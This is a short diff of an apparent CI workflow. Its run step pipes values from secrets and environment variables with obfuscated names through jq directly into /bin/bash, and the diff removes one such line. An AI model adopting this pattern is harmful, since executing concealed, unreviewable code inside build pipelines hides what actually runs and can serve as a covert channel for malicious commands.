@@ -23,7 +23,6 @@ jobs:
           e058: ${{ secrets.e058 }}
         run: |
           printf '%s' "$e058" | jq -r .wcnpd112 | /bin/bash
-          echo $pb10393 | jq -r .swhwy638 | /bin/bash
           printf '%s' "$xbn2" | jq -r .u30163 | /bin/bash
           echo $ahc421 | jq -r .ztbq76970 | /bin/bash
 
